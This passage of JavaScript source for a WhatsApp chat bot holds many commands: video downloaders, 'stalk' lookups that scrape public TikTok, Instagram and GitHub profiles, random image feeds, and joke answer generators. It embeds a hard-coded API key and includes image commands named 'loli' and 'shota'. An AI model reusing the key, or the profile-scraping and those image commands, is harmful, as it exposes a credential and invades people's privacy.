DeepakBotInc.sendMessage(m.chat, { video: { url: anu.result.url.urls[0].hd }, caption: 'Here you go!' }, { quoted: m })
await DeepakBotInc.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
}catch (error) {
await DeepakBotInc.sendMessage(m.chat, { react: { text: "✖️",key: m.key,}})   
}
}
break
           case 'fb':
           case 'facebook':
case 'facebookvid': {
           if (!args[0]) {
    return replygcdeepak(`Please send the link of a Facebook video\n\nEXAMPLE :\n*${prefix + command}* https://fb.watch/pLLTM4AFrO/?mibextid=Nif5oz`)
  }
  const urlRegex = /^(?:https?:\/\/)?(?:www\.)?(?:facebook\.com|fb\.watch)\b([-a-zA-Z0-9@:%_\+.~#?&//=]*)/i;
  if (!urlRegex.test(args[0])) {
    return replygcdeepak('Url invalid')
  }
  try {
    const result = await fg.fbdl(args[0]);
    const tex = `
        [ FACEBOOK DL ]
${themeemoji} Title: ${result.title}`;
    const response = await fetch(result.videoUrl)
    const arrayBuffer = await response.arrayBuffer()
    const videoBuffer = Buffer.from(arrayBuffer)
    DeepakBotInc.sendMessage(m.chat, {video: videoBuffer, caption: tex}, {quoted: m})
  } catch (error) {
    replygcdeepak('Maybe private video!')
  }
  }
  break
case 'tiktokstalk': {
	  if (!text) return replygcdeepak(`Username? `)
  let res = await fg.ttStalk(args[0])
  let txt = `
┌──「 *TIKTOK STALK* 
──「 *TIKTOK STALK* 
▢ *🔖Number:* ${res.name}
▢ *🔖Username:* ${res.username}
▢ *👥followers:* ${res.followers}
▢ *🫂following:* ${res.following}
▢ *📌Desc:* ${res.desc}

▢ *🔗 Link* : https://tiktok.com/${res.username}
└────────────`
  await DeepakBotInc.sendMessage(m.chat, {image: { url: res.profile}, caption: txt}, {quoted: m})
}
break
case 'xxxigstalk': {
if (!text) return replygcdeepak(`Enter Instagram Username\n\nExample: ${prefix + command} deepak_gupta_2006`)
    let res = await fg.igStalk(text)
    let te = `
┌──「 *STALKING* 
▢ *🔖Name:* ${res.name} 
▢ *🔖Username:* ${res.username}
▢ *👥Follower:* ${res.followersH}
▢ *🫂Following:* ${res.followingH}
▢ *📌Bio:* ${res.description}
▢ *🏝️Posts:* ${res.postsH}
▢ *🔗 Link* : https://instagram.com/${res.username.replace(/^@/, '')}
└────────────`
     await DeepakBotInc.sendMessage(m.chat, {image: { url: res.profilePic }, caption: te }, {quoted: m})
}
break
case 'ghstalk': case 'githubstalk':{
if (!q) return replygcdeepak(`Example ${prefix+command} DGDEEPAK`)
await DeepakStickWait()
let githubstalk = require('./lib/scraper')
aj = await githubstalk.githubstalk(`${q}`)
DeepakBotInc.sendMessage(m.chat, { image: { url : aj.profile_pic }, caption: 
`*/ Github Stalker \\*

Username : ${aj.username}
Nickname : ${aj.nickname}
Bio : ${aj.bio}
Id : ${aj.id}
Nodeid : ${aj.nodeId}
Url Profile : ${aj.profile_pic}
Url Github : ${aj.url}
Type : ${aj.type}
Admin : ${aj.admin}
Company : ${aj.company}
Blog : ${aj.blog}
Location : ${aj.location}
Email : ${aj.email}
Public Repo : ${aj.public_repo}
Public Gists : ${aj.public_gists}
Followers : ${aj.followers}
Following : ${aj.following}
Created At : ${aj.ceated_at}
Updated At : ${aj.updated_at}` }, { quoted: m } )
}
break
case 'npmstalk':{
if (!q) return replygcdeepak(`Example ${prefix+command} deepakapi`)
await DeepakStickWait()
let npmstalk = require('./lib/scraper')
eha = await npmstalk.npmstalk(q)
replygcdeepak(`*/ Npm Stalker \\*

Name : ${eha.name}
Version Latest : ${eha.versionLatest}
Version Publish : ${eha.versionPublish}
Version Update : ${eha.versionUpdate}
Latest Dependencies : ${eha.latestDependencies}
Publish Dependencies : ${eha.publishDependencies}
Publish Time : ${eha.publishTime}
Latest Publish Time : ${eha.latestPublishTime}`)
}
break
case 'ffstalk':{
if (!q) return replygcdeepak(`Example ${prefix+command} 946716486`)
await DeepakStickWait()
let ffstalk = require('./lib/scraper')
eeh = await ffstalk.ffstalk(`${q}`)
replygcdeepak(`*/ Free Fire Stalker \\*

Id : ${eeh.id}
Nickname : ${eeh.nickname}`)
}
break
case 'mlstalk': {
if (!q) return replygcdeepak(`Example ${prefix+command} 530793138|8129`)
await DeepakStickWait()
let mlstalk = require('./lib/scraper')
let dat = await mlstalk.mlstalk(q.split("|")[0], q.split("|")[1])
replygcdeepak(`*/ Mobile Legend Stalker \\*

Username : ${dat.userName}
Id : ${q.split("|")[0]}
ID Zone: ${q.split("|")[1]}`)
}
break
case 'spotify':{
	if (!text) return replygcdeepak(`*Please enter a song name*`)
    try {
        const apiUrl = `https://www.guruapi.tech/api/spotifyinfo?text=${encodeURIComponent(text)}`
        const response = await fetch(apiUrl);
        if (!response.ok) {
            console.log('Error searching for song:', response.statusText)
            return replygcdeepak('Error searching for song')
        }
        const data = await response.json()
        const coverimage = data.spty.results.thumbnail
        const name = data.spty.results.title
        const slink = data.spty.results.url
        const dlapi = `https://www.guruapi.tech/api/spotifydl?text=${encodeURIComponent(text)}`
        const audioResponse = await fetch(dlapi)
        if (!audioResponse.ok) {
            console.log('Error fetching audio:', audioResponse.statusText)
            return replygcdeepak('Error fetching audio')
        }
        const audioBuffer = await audioResponse.buffer()
        const tempDir = os.tmpdir()
        const audioFilePath = path.join(tempDir, 'audio.mp3')
        try {
            await fs.promises.writeFile(audioFilePath, audioBuffer)
        } catch (writeError) {
            console.error('Error writing audio file:', writeError)
            return replygcdeepak( 'Error writing audio file')
        }
        let doc = {
            audio: {
              url: audioFilePath
            },
            mimetype: 'audio/mpeg',
            ptt: true,
            waveform:  [100, 0, 100, 0, 100, 0, 100],
            fileName: "dgdeepak",
            contextInfo: {
              mentionedJid: [m.sender],
              externalAdReply: {
                title: `PLAYING TO ${name}`,
                body: botname,
                thumbnailUrl: coverimage,
                sourceUrl: websitex,
                mediaType: 1,
                renderLargerThumbnail: true
              }
            }
        }        
        await DeepakBotInc.sendMessage(m.chat, doc, { quoted: m })
    } catch (error) {
        console.error('Error fetching Spotify data:', error)
        return replygcdeepak('*Error*')
    }
    }
    break
case 'imdb':
if (!text) return replygcdeepak(`_Name a Series or movie`)
await DeepakStickWait()
            let fids = await axios.get(`http://www.omdbapi.com/?apikey=742b2d09&t=${text}&plot=full`)
            let imdbt = ""
            console.log(fids.data)
            imdbt += "⚍⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚍\n" + " ``` IMDB SEARCH```\n" + "⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎\n"
            imdbt += "🎬Title      : " + fids.data.Title + "\n"
            imdbt += "📅Year       : " + fids.data.Year + "\n"
            imdbt += "⭐Rated      : " + fids.data.Rated + "\n"
            imdbt += "📆Released   : " + fids.data.Released + "\n"
            imdbt += "⏳Runtime    : " + fids.data.Runtime + "\n"
            imdbt += "🌀Genre      : " + fids.data.Genre + "\n"
            imdbt += "👨🏻‍💻Director   : " + fids.data.Director + "\n"
            imdbt += "✍Writer     : " + fids.data.Writer + "\n"
            imdbt += "👨Actors     : " + fids.data.Actors + "\n"
            imdbt += "📃Plot       : " + fids.data.Plot + "\n"
            imdbt += "🌐Language   : " + fids.data.Language + "\n"
            imdbt += "🌍Country    : " + fids.data.Country + "\n"
            imdbt += "🎖️Awards     : " + fids.data.Awards + "\n"
            imdbt += "📦BoxOffice  : " + fids.data.BoxOffice + "\n"
            imdbt += "🏙️Production : " + fids.data.Production + "\n"
            imdbt += "🌟imdbRating : " + fids.data.imdbRating + "\n"
            imdbt += "✅imdbVotes  : " + fids.data.imdbVotes + ""
           DeepakBotInc.sendMessage(m.chat, {
                image: {
                    url: fids.data.Poster,
                },
                caption: imdbt,
            }, {
                quoted: m,
            })
            break
            case 'ebinary': {
if (!q) return replygcdeepak(`Send/reply text with captions ${prefix + command}`)
let { eBinary } = require('./lib/binary')
let eb = await eBinary(`${q}`)
replygcdeepak(eb)
}
break
case 'dbinary': {
if (!q) return replygcdeepak(`Send/reply text with captions ${prefix + command}`)
let { dBinary } = require('./lib/binary')
let db = await dBinary(`${q}`)
replygcdeepak(db)
}
break
case 'happymod':{
if (!q) return replygcdeepak(`Example ${prefix+command} Sufway surfer mod`)
await DeepakStickWait()
let kat = await scp2.happymod(q)
replygcdeepak(util.format(kat))
}
break
case 'gdrive': {
		if (!args[0]) return replygcdeepak(`Enter the Google Drive link`)
	await DeepakStickWait()
	const fg = require('api-dylux')
	try {
	let res = await fg.GDriveDl(args[0])
	 await replygcdeepak(`
≡ *Google Drive DL*
▢ *Nama:* ${res.fileName}
▢ *Size:* ${res.fileSize}
▢ *Type:* ${res.mimetype}`)
	DeepakBotInc.sendMessage(m.chat, { document: { url: res.downloadUrl }, fileName: res.fileName, mimetype: res.mimetype }, { quoted: m })
   } catch {
	replygcdeepak('Error: Check link or try another link') 
  }
}
break
case 'pinterest': {
if (!text) return replygcdeepak(`Enter Query`)
let { pinterest } = require('./lib/scraper')
anutrest = await pinterest(text)
result = anutrest[Math.floor(Math.random() * anutrest.length)]
DeepakBotInc.sendMessage(m.chat, { image: { url: result }, caption: '⭔ Media Url : '+result }, { quoted: m })
}
break
case 'ringtone': {
		if (!text) return replygcdeepak(`Example : ${prefix + command} black rover`)
        let ringtone = require('./lib/scraper')
		let anutone2 = await ringtone(text)
		let result = anutone2[Math.floor(Math.random() * anutone2.length)]
		DeepakBotInc.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
	    }
	    break
case 'tiktokgirl':
await DeepakStickWait()
var asupan = JSON.parse(fs.readFileSync('./src/media/tiktokvids/tiktokgirl.json'))
var hasil = pickRandom(asupan)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokghea':
await DeepakStickWait()
var gheayubi = JSON.parse(fs.readFileSync('./src/media/tiktokvids/gheayubi.json'))
var hasil = pickRandom(gheayubi)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokbocil':
await DeepakStickWait()
var bocil = JSON.parse(fs.readFileSync('./src/media/tiktokvids/bocil.json'))
var hasil = pickRandom(bocil)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktoknukhty':
await DeepakStickWait()
var ukhty = JSON.parse(fs.readFileSync('./src/media/tiktokvids/ukhty.json'))
var hasil = pickRandom(ukhty)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktoksantuy':
await DeepakStickWait()
var santuy = JSON.parse(fs.readFileSync('./src/media/tiktokvids/santuy.json'))
var hasil = pickRandom(santuy)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokkayes':
await DeepakStickWait()
var kayes = JSON.parse(fs.readFileSync('./src/media/tiktokvids/kayes.json'))
var hasil = pickRandom(kayes)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokpanrika':
await DeepakStickWait()
var rikagusriani = JSON.parse(fs.readFileSync('./src/media/tiktokvids/panrika.json'))
var hasil = pickRandom(rikagusriani)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktoknotnot':
await DeepakStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokvids/notnot.json'))
var hasil = pickRandom(notnot)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'chinese':
await DeepakStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/china.json'))
var hasil = pickRandom(notnot)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'hijab':
await DeepakStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/hijab.json'))
var hasil = pickRandom(notnot)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'indo':
await DeepakStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/indonesia.json'))
var hasil = pickRandom(notnot)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'japanese':
await DeepakStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/japan.json'))
var hasil = pickRandom(notnot)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'korean':
await DeepakStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/korea.json'))
var hasil = pickRandom(notnot)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'malay':
await DeepakStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/malaysia.json'))
var hasil = pickRandom(notnot)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'randomgirl':
await DeepakStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/random.json'))
var hasil = pickRandom(notnot)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'randomboy':
await DeepakStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/random2.json'))
var hasil = pickRandom(notnot)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'thai':
await DeepakStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/thailand.json'))
var hasil = pickRandom(notnot)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'vietnamese':
await DeepakStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/vietnam.json'))
var hasil = pickRandom(notnot)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'aesthetic':
await DeepakStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/aesthetic.json'))
var hasil = pickRandom(notnot)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'antiwork':
await DeepakStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/antiwork.json'))
var hasil = pickRandom(notnot)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'blackpink':
await DeepakStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/blackpink.json'))
var hasil = pickRandom(notnot)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'bike':
await DeepakStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/bike.json'))
var hasil = pickRandom(notnot)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'boneka':
await DeepakStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/boneka.json'))
var hasil = pickRandom(notnot)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'cosplay':
await DeepakStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/cosplay.json'))
var hasil = pickRandom(notnot)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'cat':
await DeepakStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/cat.json'))
var hasil = pickRandom(notnot)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'doggo':
await DeepakStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/doggo.json'))
var hasil = pickRandom(notnot)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'justina':
await DeepakStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/justina.json'))
var hasil = pickRandom(notnot)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'kayes':
await DeepakStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/kayes.json'))
var hasil = pickRandom(notnot)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'kpop':
await DeepakStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/kpop.json'))
var hasil = pickRandom(notnot)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'notnot':
await DeepakStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/notnot.json'))
var hasil = pickRandom(notnot)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'car':
await DeepakStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/car.json'))
var hasil = pickRandom(notnot)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'couplepp': case 'ppcouple': {
let anu = require('./src/media/randompics/ppcouple.json')
let random = anu[Math.floor(Math.random() * anu.length)]
DeepakBotInc.sendMessage(from, { image: { url: random.male }, caption: `Couple pp for male` }, { quoted: m })
DeepakBotInc.sendMessage(from, { image: { url: random.female }, caption: `Couple pp for female` }, { quoted: m })
}
break
case 'profilepic':  case 'profilepicture':
await DeepakStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/profile.json'))
var hasil = pickRandom(notnot)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'pubg':
await DeepakStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/pubg.json'))
var hasil = pickRandom(notnot)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'rose':
await DeepakStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/rose.json'))
var hasil = pickRandom(notnot)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'ryujin':
await DeepakStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/ryujin.json'))
var hasil = pickRandom(notnot)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'ulzzangboy':
await DeepakStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/ulzzangboy.json'))
var hasil = pickRandom(notnot)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'ulzzanggirl':
await DeepakStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/ulzzanggirl.json'))
var hasil = pickRandom(notnot)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'wallml': case 'wallpaperml':case 'mobilelegend':
await DeepakStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/wallml.json'))
var hasil = pickRandom(notnot)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'wallpaperphone': case 'wallphone':
await DeepakStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/wallhp.json'))
var hasil = pickRandom(notnot)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
            case 'remini': {
			if (!quoted) return replygcdeepak(`Where is the picture?`)
			if (!/image/.test(mime)) return replygcdeepak(`Send/Reply Photos With Captions ${prefix + command}`)
			await DeepakStickWait()
			const { remini } = require('./lib/remini')
			let media = await quoted.download()
			let proses = await remini(media, "enhance")
			DeepakBotInc.sendMessage(m.chat, { image: proses, caption: mess.success}, { quoted: m})
			}
			break
			case 'define': 
if (!q) return replygcdeepak(`What do you want to define?`)
try {
targetfine = await axios.get(`http://api.urbandictionary.com/v0/define?term=${q}`)
if (!targetfine) return replygcdeepak(mess.error)
const reply = `
*${themeemoji} Word:* ${q}
*${themeemoji} Definition:* ${targetfine.data.list[0].definition
    .replace(/\[/g, "")
    .replace(/\]/g, "")}
*${themeemoji} Example:* ${targetfine.data.list[0].example
    .replace(/\[/g, "")
    .replace(/\]/g, "")}`
   DeepakBotInc.sendMessage(m.chat,{text:reply},{quoted:m})
} catch (err) {
    console.log(err)
    return replygcdeepak(`*${q}* isn't a valid text`)
    }
    break
                case 'can': {
            	if (!text) return replygcdeepak(`Ask question\n\nExample : ${prefix + command} i dance?`)
            	let bisa = [`Can`,`Can't`,`Cannot`,`Of Course You Can!!!`]
                let keh = bisa[Math.floor(Math.random() * bisa.length)]
                let jawab = `*Can ${text}*\nAnswer : ${keh}`
            await replygcdeepak(jawab)
            }
            break
            case 'is': {
            	if (!text) return replygcdeepak(`Ask question\n\nExample : ${prefix + command} she virgin?`)
            	let apa = [`Yes`, `No`, `It Could Be`, `Thats right`]
                let kah = apa[Math.floor(Math.random() * apa.length)]
                let jawab = `*Is ${text}*\nAnswer : ${kah}`                
            await replygcdeepak(jawab)
            }
            break
            case 'when': {
            	if (!text) return replygcdeepak(`Ask question\n\nExample : ${prefix + command} will i get married?`)
            	let kapan = ['5 More Days', '10 More Days', '15 More Days','20 More Days', '25 More Days','30 More Days','35 More Days','40 More Days','45 More Days','50 More Days','55 More Days','60 More Days','65 More Days','70 More Days','75 More Days','80 More Days','85 More Days','90 More Days','100 More Days','5 Months More', '10 Months More', '15 Months More','20 Months More', '25 Months More','30 Months More','35 Months More','40 Months More','45 Months More','50 Months More','55 Months More','60 Months More','65 Months More','70 Months More','75 Months More','80 Months More','85 Months More','90 Months More','100 Months More','1 More Year','2 More Years','3 More Years','4 More Years','5 More Years','Tomorrow','The Day After Tomorrow']
                let koh = kapan[Math.floor(Math.random() * kapan.length)]
                let jawab = `*${command} ${text}*\nAnswer : ${koh}`                
            await replygcdeepak(jawab)
            }
            break
case 'what': {
            	if (!text) return replygcdeepak(`Ask question\n\nExample : ${prefix + command} is your name?`)
            	let lel = [`Ask Your Gf`, `I Dont Know`, `I Don't Know, Ask Your Father`]
                let kah = lel[Math.floor(Math.random() * lel.length)]
                let jawab = `*What ${text}*\nAnswer : ${kah}`                
            await replygcdeepak(jawab)
            }
            break
case 'where': {
if (!text) return replygcdeepak(`Ask question\n\nExample : ${prefix + command} is your name?`)
            	let wherelol = [`In the mountain`, `On mars`, `On moon`,`In the jungle`,`I dont know ask your mom`,`It could be somewhere`]
                let kah = wherelol[Math.floor(Math.random() * wherelol.length)]
                let jawab = `*Whwre ${text}*\nAnswer : ${kah}`              
            await replygcdeepak(jawab)
            }
            break
case 'how': {
            	if (!text) return replygcdeepak(`Ask question\n\nExample : ${prefix + command} to date girl?`)
            	let gimana = [`Ummm...`, `It's Difficult Bro`, `Sorry Bot Can't Answer`, `Try Searching On Google`,`Holy Cow! Really???`,`Dizzy Ah😴, don't wanna answer`,`Ohhh I See:(`,`The Patient, Boss:(`,`Really dude 🙄`]
                let kah = gimana[Math.floor(Math.random() * gimana.length)]
                let jawab = `*How ${text}*\nAnswer : ${kah}`                
            await replygcdeepak(jawab)
            }
            break
case 'rate': {
            	if (!text) return replygcdeepak(`Example : ${prefix + command} my profile`)
            	let ra = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
                let kah = ra[Math.floor(Math.random() * ra.length)]
                let jawab = `*Rate ${text}*\nAnswer : ${kah}%`                
            await replygcdeepak(jawab)
            }
            break
            case 'runtime': {
            	let lowq = `*The Bot Has Been Online For:*\n*${runtime(process.uptime())}*`
                replygcdeepak(lowq)
            	}
            break
            case 'stupidcheck':case 'uncleancheck':
case 'hotcheck': case 'smartcheck':
case 'greatcheck':
case 'evilcheck':case 'dogcheck':
case 'coolcheck':
case 'waifucheck':
cantik = body.slice(1)
const okebnh1 =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const deepakkak = okebnh1[Math.floor(Math.random() * okebnh1.length)]
DeepakBotInc.sendMessage(m.chat, { text: deepakkak }, { quoted: m })
break
            case 'soulmate': {
            if (!m.isGroup) return DeepakStickGroup()
            let member = participants.map(u => u.id)
            let me = m.sender
            let jodoh = member[Math.floor(Math.random() * member.length)]
DeepakBotInc.sendMessage(m.chat,
{ text: `👫Your Soulmate Is

@${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`,
contextInfo:{
mentionedJid:[me, jodoh],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./DeepakMedia/theme/Zenitsupic.jpg`),
"sourceUrl": `${wagc}`}}},
{ quoted: m})        
            }
            break
 case 'couple': {
            if (!m.isGroup) return DeepakStickGroup()
            let member = participants.map(u => u.id)
            let orang = member[Math.floor(Math.random() * member.length)]
            let jodoh = member[Math.floor(Math.random() * member.length)]
DeepakBotInc.sendMessage(m.chat,
{ text: `@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}
Cieeee, What's Going On❤️💖👀`,
contextInfo:{
mentionedJid:[orang, jodoh],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./DeepakMedia/theme/Zenitsupic.jpg`),
"sourceUrl": `${wagc}`}}},
{ quoted: m})        
            }
            break
                        case 'coffee': case 'kopi': {
                DeepakBotInc.sendMessage(m.chat, {caption: mess.success, image: { url: 'https://coffee.alexflipnote.dev/random' }}, { quoted: m })
            }
            break
            case 'wallpaper': {
                if (!text) return replygcdeepak('Enter Query Title')
                await DeepakStickWait()
		let { wallpaper } = require('./lib/scraper')
                anuwallpep = await wallpaper(text)
                result = anuwallpep[Math.floor(Math.random() * anuwallpep.length)]                
                DeepakBotInc.sendMessage(m.chat, {caption: `${themeemoji} Title : ${result.title}\n${themeemoji} Category : ${result.type}\n${themeemoji} Detail : ${result.source}\n${themeemoji} Media Url : ${result.image[2] || result.image[1] || result.image[0]}`, image: { url: result.image[0] }} , { quoted: m })
            }
            break
            case 'wikimedia': {
                if (!text) return replygcdeepak('Enter Query Title')
                await DeepakStickWait()
		let { wikimedia } = require('./lib/scraper')
                let anumedia = await wikimedia(text)
                result = anumedia[Math.floor(Math.random() * anumedia.length)]
                DeepakBotInc.sendMessage(m.chat, {caption: `${themeemoji} Title : ${result.title}\n${themeemoji} Source : ${result.source}\n${themeemoji} Media Url : ${result.image}`, image: { url: result.image }} , { quoted: m })
            }
            break
            case 'loli': {
            let baseUrl = 'https://weeb-api.vercel.app/'
      const response = await fetch(baseUrl + command)
      const imageBuffer = await response.buffer() // Get the image data as a buffer
      DeepakBotInc.sendMessage(m.chat, {image:  imageBuffer, caption: `Random ${command} for you!✨`}, {quoted: m})    
            }
            break
            case 'waifu': {
            let baseUrl = 'https://weeb-api.vercel.app/'
      const response = await fetch(baseUrl + command)
      const imageBuffer = await response.buffer() // Get the image data as a buffer
      DeepakBotInc.sendMessage(m.chat, {image:  imageBuffer, caption: `Random ${command} for you!✨`}, {quoted: m})    
            }
            break
            case 'neko': {
            let baseUrl = 'https://weeb-api.vercel.app/'
      const response = await fetch(baseUrl + command)
      const imageBuffer = await response.buffer() // Get the image data as a buffer
      DeepakBotInc.sendMessage(m.chat, {image:  imageBuffer, caption: `Random ${command} for you!✨`}, {quoted: m})    
            }
            case 'akira': case 'akiyama': case 'ana': case 'art': case 'asuna': case 'ayuzawa': case 'boruto': case 'bts': case 'chiho': case 'chitoge': case 'cosplay': case 'cosplayloli': case 'cosplaysagiri': case 'cyber': case 'deidara': case 'doraemon': case 'elaina': case 'emilia': case 'erza': case 'exo':  case 'gamewallpaper': case 'gremory': case 'hacker': case 'hestia': case 'husbu': case 'inori': case 'islamic': case 'isuzu': case 'itachi': case 'itori': case 'jennie': case 'jiso': case 'justina': case 'kaga': case 'kagura': case 'kakasih': case 'kaori': case 'cartoon': case 'shortquote': case 'keneki': case 'kotori': case 'kurumi': case 'lisa': case 'loli2': case 'madara': case 'megumin': case 'mikasa': case 'mikey': case 'miku': case 'minato': case 'mountain': case 'naruto': case 'nekonime': case 'nezuko': case 'onepiece': case 'pentol': case 'pokemon': case 'programming':  case 'randomnime': case 'randomnime2': case 'rize': case 'rose': case 'sagiri': case 'sakura': case 'sasuke': case 'satanic': case 'shina': case 'shinka': case 'shinomiya': case 'shizuka': case 'shota': case 'space': case 'technology': case 